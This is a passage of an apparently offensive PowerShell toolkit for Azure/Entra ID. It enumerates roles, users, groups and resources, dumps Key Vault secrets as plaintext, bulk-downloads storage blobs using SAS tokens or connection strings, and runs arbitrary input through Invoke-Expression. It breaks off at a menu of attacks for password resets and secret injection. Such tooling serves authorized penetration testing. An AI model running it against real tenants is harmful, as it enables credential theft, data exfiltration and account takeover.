                                    } elseif ($toolChoice -eq "2") {
                                        Get-AzKeyVaultSecret -VaultName $selectedVault -Name $secretName -AsPlainText
                                    }

                                    Write-Host "Secret Content: $secretContent" -ForegroundColor Cyan
                                    Write-Host "`nPress any key to return to secret selection..."
                                    [void][System.Console]::ReadKey($true)
                                } else {
                                    Write-Host "Invalid selection, no secret chosen." -ForegroundColor Red
                                }
                            }
                        } else {
                            Write-Host "No secrets found in the Key Vault." -ForegroundColor Red
                        }
                    } catch {
                        Write-Host "Error retrieving secrets: $_" -ForegroundColor Red
                    }
                } else {
                    Write-Host "Invalid selection, no Key Vault chosen." -ForegroundColor Red
                }
            }
        } else {
            Write-Host "No Key Vaults found." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error retrieving Key Vaults or secrets: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query administrative units
function AdministrativeUnitsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Administrative Units Query" -ForegroundColor Cyan

    try {
        # Retrieve all Administrative Units
        $adminUnits = Get-MgDirectoryAdministrativeUnit
        $results = @()  # Initialize a collection to store the results

        # Retrieve all Directory Roles to avoid repetitive API calls
        $directoryRoles = Get-MgDirectoryRole

        # Iterate through each Administrative Unit
        foreach ($unit in $adminUnits) {
            Write-Host "Processing Administrative Unit: $($unit.DisplayName)" -ForegroundColor Blue

            try {
                # Get all Scoped Role Members for the current Administrative Unit
                $members = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $unit.Id

                # Retrieve all populated members (users) in the Administrative Unit
                $populatedMembers = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $unit.Id | Select-Object -ExpandProperty additionalProperties

                # Collect User Principal Names of populated members
                $populatedUserPrincipalNames = $populatedMembers | Where-Object { $_.userPrincipalName } | ForEach-Object { $_.userPrincipalName }

                # If Scoped Role Members exist, extract details
                foreach ($member in $members) {
                    # Extract the role member info (e.g., user name and details)
                    $roleMember = $member | Select-Object -ExpandProperty roleMemberInfo

                    # Retrieve the directory role details for the RoleId
                    $roleDetails = $directoryRoles | Where-Object { $_.Id -eq $member.RoleId }

                    # Extract the display name of the role, if available
                    $roleName = if ($roleDetails) { $roleDetails.DisplayName } else { "Unknown Role" }

                    # Add the extracted data to the results
                    $results += [pscustomobject]@{
                        AdministrativeUnitName = $unit.DisplayName
                        RoleName               = $roleName
                        RoleAssignedUsers      = $roleMember.DisplayName
                        AUPopulatedUsers       = ($populatedUserPrincipalNames -join ", ") # Join UPNs into a single string
                    }

                    # Check if the current user is part of the RoleAssignedUsers
                    if ($roleMember.DisplayName -eq (Get-MgUser -UserId "$graphModuleAccount").DisplayName) {
                        Write-Host "NOTICE: You are a role member in '$($unit.DisplayName)' as '$roleName'." -ForegroundColor Green
                    }
                }

                # If no Scoped Role Members exist but there are populated users, add them to results
                if (-not $members -and $populatedUserPrincipalNames) {
                    $results += [pscustomobject]@{
                        AdministrativeUnitName = $unit.DisplayName
                        RoleName               = "N/A"
                        RoleAssignedUsers      = "N/A"
                        AUPopulatedUsers       = ($populatedUserPrincipalNames -join ", ") # Join UPNs into a single string
                    }
                }

            } catch {
                Write-Error "Failed to retrieve members for Administrative Unit: $($unit.DisplayName). Error: $_"
            }
        }

        # Display the results as a table
        $output = $results | Format-Table -AutoSize | Out-String
        Write-Host $output

    } catch {
        Write-Host "Error retrieving administrative units: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query owned objects
function OwnedObjectsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Owned Objects Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    # Execute and print owned objects from selected tools
    try {
        Clear-Host
        DisplayHeader

        # Azure CLI
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            if ($userId -eq $azureCliId) {
                Write-Host "Only works for current user!!!" -ForegroundColor Yellow
                $cliOutput = az ad signed-in-user list-owned-objects --output table | Out-String
                Write-Host $cliOutput
            } else {
                Write-Host "AZ CLI does not support querying other users' owned objects directly." -ForegroundColor Yellow
            }
        }

        # Az PowerShell Module
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "Owned objects via Az PS Module not directly supported." -ForegroundColor Yellow
        }

        # Graph PowerShell Module
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $graphOutput = Get-MgUserOwnedObject -UserId $userId | Select-Object * -ExpandProperty additionalProperties | Out-String
            Write-Host $graphOutput
        }
    }
    catch {
        Write-Host "Error retrieving owned objects: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query role assignments
function RoleAssignmentsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Role Assignments Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        # Azure CLI
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az role assignment list --assignee "$userId" --all | Out-String
            Write-Host $cliOutput
        }

        # Az PowerShell Module
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $psOutput = Get-AzRoleAssignment -ObjectId "$userId" | Format-Table | Out-String
            Write-Host $psOutput
        }
        
        # Graph PowerShell Module
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            Write-Host "Graph PS Module does not directly support listing role assignments in this context." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Error retrieving role assignments: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query available resources
function AvailableResourcesQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Available Resources Query" -ForegroundColor Cyan
    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az resource list --output table | Out-String
            Write-Host $cliOutput
        }

        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $psOutput = Get-AzResource | Format-Table | Out-String
            Write-Host $psOutput
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS does not support direct resource queries in this context." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Error retrieving available resources: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query user information
function UserInfoQuery {
    Clear-Host
    DisplayHeader
    Write-Host "User Info Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Results:" -ForegroundColor Cyan

        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az ad user show --id "$userId" | Out-String
            Write-Host $cliOutput
        }

        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $psOutput = Get-AzADUser -ObjectId "$userId" | Format-List | Out-String
            Write-Host $psOutput
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $graphOutput = Get-MgUser -UserId "$userId" | Format-List | Out-String
            Write-Host $graphOutput
        }
    }
    catch {
        Write-Host "Error retrieving user info: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query user groups
function UserGroupsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "User Groups Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Results:" -ForegroundColor Cyan

        # Azure CLI
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az ad user get-member-groups --id "$userId" --output table | Out-String
            Write-Host $cliOutput
        }

        # Az PowerShell Module
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "Enable/implement necessary logic for user: $userId" -ForegroundColor Yellow
            # Note: Add your specific logic here to fetch group memberships
        }

        # Graph PowerShell Module
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $groups = Get-MgUserMemberOf -UserId $userId -All
            $groupDetails = $groups | ForEach-Object {
                $groupInfo = Get-MgGroup -GroupId $_.Id
                [PSCustomObject]@{
                    DisplayName = $groupInfo.DisplayName
                    Id = $groupInfo.Id
                }
            } | Format-Table -AutoSize | Out-String
            Write-Host $groupDetails
        }
    }
    catch {
        Write-Host "Error retrieving user groups: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query group members
function GroupMembersQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Group Members Query" -ForegroundColor Cyan
    Write-Host "Enter a group name:" -ForegroundColor Yellow
    $groupName = Read-Host

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        # Retrieve the group ID using the group name
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            $groupId = az ad group show --group "$groupName" --query id -o tsv
            if ($groupId) {
                Write-Host "AZ CLI output:" -ForegroundColor Magenta
                $cliOutput = az ad group member list --group "$groupId" --output table | Out-String
                Write-Host $cliOutput
            } else {
                Write-Host "Invalid group name for AZ CLI." -ForegroundColor Red
            }
        }

        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            $group = Get-AzADGroup -DisplayName "$groupName"
            if ($group) {
                Write-Host "AZ PS Module output:" -ForegroundColor Magenta
                $psOutput = Get-AzADGroupMember -GroupObjectId $group.Id | Format-Table | Out-String
                Write-Host $psOutput
            } else {
                Write-Host "Invalid group name for Az PS Module." -ForegroundColor Red
            }
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            $group = Get-MgGroup -Filter "displayName eq '$groupName'"
            if ($group) {
                Write-Host "Graph PS Module output:" -ForegroundColor Magenta
                $members = Get-MgGroupMember -GroupId $group.Id
                $graphOutput = $members | ForEach-Object {
                    $user = Get-MgUser -UserId $_.Id
                    [PSCustomObject]@{
                        DisplayName = $user.DisplayName
                        Id = $_.Id
                    }
                } | Format-Table -AutoSize | Out-String
                Write-Host $graphOutput
            } else {
                Write-Host "Invalid group name for Graph PS Module." -ForegroundColor Red
            }
        }
    }
    catch {
        Write-Host "Error retrieving group members: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to handle raw PowerShell command execution
function RawCommandPrompt {
    Clear-Host
    DisplayHeader
    Write-Host "Raw Command Prompt" -ForegroundColor Cyan
    Write-Host "Enter 'exit' to return to the queries menu." -ForegroundColor Yellow

    while ($true) {
        try {
            $command = Read-Host -Prompt "PS"
            if ($command -eq "exit") {
                break
            }
            Clear-Host
            DisplayHeader
            Write-Host "Raw Command Prompt" -ForegroundColor Cyan
            Write-Host "PS: $command" -ForegroundColor Yellow
            $output = Invoke-Expression $command 2>&1 | Out-String
            Write-Host $output
        }
        catch {
            Write-Host "Error executing command: $_" -ForegroundColor Red
        }
    }
}

# Storage submenu
function StorageMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Storage Menu" -ForegroundColor Cyan
        Write-Host "1. List All Storage Accounts"
        Write-Host "2. List Storage Resources"
        Write-Host "3. List Blobs in Container"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                ListStorageAccounts
            }
            "2" {
                ListStorageResources
            }
            "3" {
                ListBlobsInContainer
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to list storage accounts
function ListStorageAccounts {
    Clear-Host
    DisplayHeader
    Write-Host "List All Storage Accounts" -ForegroundColor Cyan
    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            Write-Host "The following Storage Accounts were found:" -ForegroundColor Cyan
            $cliOutput = az storage account list --query "[].name" -o tsv | Out-String
            Write-Host $cliOutput
        }
        
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "The following Storage Accounts were found:" -ForegroundColor Cyan
            $psOutput = Get-AzStorageAccount | Format-Table | Out-String
            Write-Host $psOutput
        }
    }
    catch {
        Write-Host "Error retrieving storage accounts: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the storage menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to list storage resources and manage blobs and tables
function ListStorageResources {
    Clear-Host
    DisplayHeader
    Write-Host "List Storage Resources" -ForegroundColor Cyan

    Write-Host "Enter the storage account name:" -ForegroundColor Yellow
    $accountName = Read-Host

    Write-Host "Select authentication method:" -ForegroundColor Yellow
    Write-Host "1. Current Account" -ForegroundColor Yellow
    Write-Host "2. SAS Token" -ForegroundColor Yellow
    Write-Host "3. Connection String" -ForegroundColor Yellow
    $authChoice = Read-Host

    $sasToken = ""
    $connectionString = ""

    if ($authChoice -eq "2") {
        Write-Host "Enter SAS token:" -ForegroundColor Yellow
        $sasToken = Read-Host
    } elseif ($authChoice -eq "3") {
        Write-Host "Enter Connection String:" -ForegroundColor Yellow
        $connectionString = Read-Host
    }

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Checking storage resources..." -ForegroundColor Magenta

        # Initialize containers and tables as empty to ensure both are checked
        $containers = @()
        $tables = @()

        # Retrieve containers
        try {
            $containers = if ($authChoice -eq "1") {
                az storage container list --account-name $accountName --query "[].{Name:name}" -o tsv --auth-mode login
            } elseif ($authChoice -eq "2") {
                az storage container list --account-name $accountName --sas-token "`"$sasToken`"" --query "[].{Name:name}" -o tsv
            } elseif ($authChoice -eq "3") {
                az storage container list --account-name $accountName --connection-string "$connectionString" --query "[].{Name:name}" -o tsv
            }
        } catch {
            Write-Host "Error retrieving containers: $_" -ForegroundColor Red
        }

        # Retrieve tables
        try {
            $tables = if ($authChoice -eq "1") {
                az storage table list --account-name $accountName -o tsv --auth-mode login
            } elseif ($authChoice -eq "2") {
                az storage table list --account-name $accountName --sas-token "`"$sasToken`"" -o tsv
            } elseif ($authChoice -eq "3") {
                az storage table list --account-name $accountName --connection-string "$connectionString" -o tsv
            }
        } catch {
            Write-Host "Error retrieving tables: $_" -ForegroundColor Red
        }

        $containerList = $containers -split "`n"
        $tableList = $tables -split "`n"

        if ($containerList.Count -gt 0 -or $tableList.Count -gt 0) {
            Write-Host "The following containers and tables were found:" -ForegroundColor Yellow

            if ($containerList.Count -gt 0) {
                Write-Host "Containers:" -ForegroundColor Cyan
                $containerList | ForEach-Object { Write-Host $_ -ForegroundColor Green }
            } else {
                Write-Host "Containers:" -ForegroundColor Cyan
                Write-Host "No containers found." -ForegroundColor Red
            }

            if ($tableList.Count -gt 0) {
                Write-Host "`nTables:" -ForegroundColor Cyan
                $tableList | ForEach-Object { Write-Host $_ -ForegroundColor Green }
            } else {
                Write-Host "`nTables:" -ForegroundColor Cyan
                Write-Host "No tables found." -ForegroundColor Red
            }

            # Decide if digging into containers or tables
            while ($true) {
                Write-Host "`nWould you like to explore containers or tables? Enter C for containers, T for tables, or B to go back to the menu." -ForegroundColor Yellow
                $choice = Read-Host "Select C, T, or B"

                if ($choice -eq "B") {
                    return
                }

                if ($choice -eq "C" -and $containerList.Count -gt 0) {
                    # Dig into container logic
                    while ($true) {
                        Write-Host "Select a container to query blobs:" -ForegroundColor Yellow
                        for ($i = 0; $i -lt $containerList.Count; $i++) {
                            Write-Host "$($i + 1). $($containerList[$i].Trim())" -ForegroundColor Green
                        }
                        Write-Host "B. Back to resource selection" -ForegroundColor Cyan
                        Write-Host "M. Return to main menu" -ForegroundColor Cyan

                        $selectedOption = Read-Host "Enter a number to select a container, B, or M"

                        if ($selectedOption -eq "B") {
                            break
                        }

                        if ($selectedOption -eq "M") {
                            return
                        }

                        if ($selectedOption -ge 1 -and $selectedOption -le $containerList.Count) {
                            $selectedContainer = $containerList[$selectedOption - 1].Trim()
                            Write-Host "`nQuerying blobs in container '$selectedContainer'..." -ForegroundColor Yellow

                            $blobList = if ($authChoice -eq "1") {
                                az storage blob list --account-name $accountName --container-name $selectedContainer --query "[].name" -o tsv --auth-mode login
                            } elseif ($authChoice -eq "2") {
                                az storage blob list --account-name $accountName --container-name $selectedContainer --sas-token "`"$sasToken`"" --query "[].name" -o tsv
                            } elseif ($authChoice -eq "3") {
                                az storage blob list --account-name $accountName --container-name $selectedContainer --connection-string "$connectionString" --query "[].name" -o tsv
                            }

                            $blobs = $blobList -split "`n"
                            if ($blobs.Count -gt 0) {
                                while ($true) {
                                    Write-Host "Select a blob to download, 'A' for all blobs, or 'B' to go back to container selection:" -ForegroundColor Yellow
                                    for ($i = 0; $i -lt $blobs.Count; $i++) {
                                        Write-Host "$($i + 1). $($blobs[$i].Trim())" -ForegroundColor Green
                                    }
                                    Write-Host "A. Download All Blobs" -ForegroundColor Cyan
                                    Write-Host "B. Return to container selection" -ForegroundColor Cyan

                                    $selectedBlob = Read-Host "Enter a number, 'A', or 'B'"

                                    if ($selectedBlob -eq "B") {
                                        break
                                    }

                                    if ($selectedBlob -eq "A") {
                                        $destinationDir = Read-Host "Enter directory to save files or press Enter for current directory"
                                        $destinationDir = if ($destinationDir -eq "") { "." } else { $destinationDir }

                                        foreach ($blobName in $blobs) {
                                            Write-Host "`nDownloading blob '$blobName'..." -ForegroundColor Yellow
                                            $destinationPath = Join-Path -Path $destinationDir -ChildPath $blobName.Trim()

                                            if ($authChoice -eq "1") {
                                                az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName.Trim() --file $destinationPath --output none --auth-mode login
                                            } elseif ($authChoice -eq "2") {
                                                az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName.Trim() --sas-token "`"$sasToken`"" --file $destinationPath --output none
                                            } elseif ($authChoice -eq "3") {
                                                az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName.Trim() --connection-string "$connectionString" --file $destinationPath --output none
                                            }
                                        }
                                        Write-Host "All blobs downloaded to '$destinationDir'" -ForegroundColor Green
                                    } elseif ($selectedBlob -ge 1 -and $selectedBlob -le $blobs.Count) {
                                        $blobName = $blobs[$selectedBlob - 1].Trim()
                                        Write-Host "`nDownloading blob '$blobName'..." -ForegroundColor Yellow
                                        $destinationPath = Read-Host "Enter the file path to save the blob (or press Enter to save as '$blobName' in current directory)"

                                        $destinationPath = if ($destinationPath -eq "") { ".\$blobName" } else { $destinationPath }

                                        if ($authChoice -eq "1") {
                                            az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName --file $destinationPath --output none --auth-mode login
                                        } elseif ($authChoice -eq "2") {
                                            az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName --sas-token "`"$sasToken`"" --file $destinationPath --output none
                                        } elseif ($authChoice -eq "3") {
                                            az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName --connection-string "$connectionString" --file $destinationPath --output none
                                        }

                                        Write-Host "Blob '$blobName' downloaded to '$destinationPath'" -ForegroundColor Green
                                    } else {
                                        Write-Host "Invalid selection." -ForegroundColor Red
                                    }
                                }
                            } else {
                                Write-Host "No blobs found in the container." -ForegroundColor Red
                            }
                        } else {
                            Write-Host "Invalid selection, no container chosen." -ForegroundColor Red
                        }
                    }
                } elseif ($choice -eq "T" -and $tableList.Count -gt 0) {
                    # Dig into table logic
                    while ($true) {
                        Write-Host "Select a table to query or 'B' to go back:" -ForegroundColor Yellow
                        for ($i = 0; $i -lt $tableList.Count; $i++) {
                            Write-Host "$($i + 1). $($tableList[$i].Trim())" -ForegroundColor Green
                        }
                        Write-Host "B. Back to resource selection" -ForegroundColor Cyan
                        Write-Host "M. Return to main menu" -ForegroundColor Cyan

                        $selectedTableOption = Read-Host "Enter a number to select a table or 'B' to go back"

                        if ($selectedTableOption -eq "B") {
                            break
                        }

                        if ($selectedTableOption -eq "M") {
                            return
                        }

                        if ($selectedTableOption -ge 1 -and $selectedTableOption -le $tableList.Count) {
                            $selectedTable = $tableList[$selectedTableOption - 1].Trim()
                            Write-Host "`nQuerying table '$selectedTable'..." -ForegroundColor Yellow

                            # Prompt for the number of entries to display
                            Write-Host "Enter the number of entries to display, or press Enter to show all entries:" -ForegroundColor Yellow
                            $entries = Read-Host
                            $numResultsArg = if ($entries -eq "") { @() } else { @("--num-results", $entries) }

                            # Query table items
                            $tableItems = if ($authChoice -eq "1") {
                               & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --auth-mode login -o table | Out-String
                            } elseif ($authChoice -eq "2") {
                               & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --sas-token "`"$sasToken`"" -o table | Out-String
                            } elseif ($authChoice -eq "3") {
                               & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --connection-string "$connectionString" -o table | Out-String
                            }

                            Write-Host $tableItems
                            Write-Host "`nPress any key to return to table selection..."
                            [void][System.Console]::ReadKey($true)
                        } else {
                            Write-Host "Invalid selection, no table chosen." -ForegroundColor Red
                        }
                    }
                }
            } else {
                Write-Host "No valid selection or resources." -ForegroundColor Red
            }
        } else {
            Write-Host "No containers or tables found in the storage account." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error retrieving storage resources: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the storage menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to list blobs in a storage container
function ListBlobsInContainer {
    Clear-Host
    DisplayHeader
    Write-Host "List Blobs in Storage Container" -ForegroundColor Cyan

    Write-Host "Enter the storage account name:" -ForegroundColor Yellow
    $accountName = Read-Host

    Write-Host "Enter the container name:" -ForegroundColor Yellow
    $containerName = Read-Host

    Write-Host "Select authentication method:" -ForegroundColor Yellow
    Write-Host "1. Current Account" -ForegroundColor Yellow
    Write-Host "2. SAS Token" -ForegroundColor Yellow
    Write-Host "3. Connection String" -ForegroundColor Yellow
    $authChoice = Read-Host

    $sasToken = ""
    $connectionString = ""

    if ($authChoice -eq "2") {
        Write-Host "Enter SAS token:" -ForegroundColor Yellow
        $sasToken = Read-Host
    } elseif ($authChoice -eq "3") {
        Write-Host "Enter Connection String:" -ForegroundColor Yellow
        $connectionString = Read-Host
    }

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "AZ CLI output:" -ForegroundColor Magenta

        if ($authChoice -eq "1") {
            # Use current account
            $blobOutput = az storage blob list --account-name $accountName --container-name $containerName --output table | Out-String
            Write-Host $blobOutput
        } elseif ($authChoice -eq "2") {
            # Use SAS token
            $blobOutput = az storage blob list --account-name $accountName --container-name $containerName --sas-token "`"$sasToken`"" --output table | Out-String
            Write-Host $blobOutput
        } elseif ($authChoice -eq "3") {
            # Use connection string
            $blobOutput = az storage blob list --account-name $accountName --container-name $containerName --connection-string "$connectionString" --output table | Out-String
            Write-Host $blobOutput
        } else {
            Write-Host "Invalid selection, returning to storage menu." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error retrieving blobs: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the storage menu..."
    [void][System.Console]::ReadKey($true)
}

# Attacks menu structure
function AttacksMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Attacks Menu" -ForegroundColor Cyan
        Write-Host "1. Reset a User's Password via Graph PS Module"
        Write-Host "2. Set New Secret for Application via Graph PS Module"
        Write-Host "3. Set New Secret for Service Principal"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
